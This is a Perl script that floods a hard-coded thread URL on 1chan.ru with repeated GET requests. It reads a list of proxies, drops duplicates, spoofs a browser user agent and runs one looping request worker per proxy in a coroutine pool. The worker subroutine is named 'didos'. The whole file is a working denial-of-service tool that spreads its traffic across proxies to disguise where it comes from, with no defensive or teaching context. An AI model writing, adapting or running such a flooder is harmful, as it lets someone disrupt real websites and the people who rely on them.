use 5.010;
use strict;
use warnings;
use autodie;

use LWP;

use YobaCoro;

#-------------------------------------------------

my $url        = "http://1chan.ru/news/res/2286463/";
my $proxylist  = "/home/user/prog/perl/piston/2net";
my $timeout    = 1;
my $max_errors = 10;


my $lwp = new LWP::UserAgent;
$lwp->agent("Opera/9.80 (X11; Linux i686; U; en) Presto/2.10.229 Version/11.61");

#-------------------------------------------------

sub read_file($)
{
   my($fname) = @_;
   open my $fh, "<", $fname;
   read $fh, my $data, -s $fname;
   return $data;
}

sub parse_proxies($)
{
   my($text) = @_;
   my %tmp;
   my @proxies = grep { !$tmp{$_}++ } $text =~ m~((?:\w+://)?[a-z0-9\.]*?\.(?:.{2,3}|\d{1,3}):\d{2,4})~gm;
   my @result;
   my %ips;
   for my $proxy (@proxies)
   {
      my($ip) = $proxy =~ m~(?:\w+://)?(.*?):\d+~;
      next if length $ip < 8;
      push @result, $proxy unless $ips{$ip}++;
   }
   return map { m~^\w+://~ ? $_ : "http://$_" } @result;
}

sub read_proxylist($)
{
   my($fname) = @_;
   return parse_proxies read_file $fname;
}

#-------------------------------------------------

sub didos
{
   my($proxy) = @_;
   my $lwp = $lwp->clone;
   $lwp->proxy(["http", "https"], $proxy);
   my $errors = 0;
   while(1)
   {
      my $res = $lwp->get($url);
      say "$proxy: ", $res->status_line;

      $errors++ unless $res->is_success;
      last if $max_errors != 0 && $errors >= $max_errors;
      
      sleep $timeout;
   }
}

#-------------------------------------------------

my @proxies = read_proxylist $proxylist;

my $pool = pool \&didos, \@proxies, { desc => "didos", debug => 1, join => 1 };

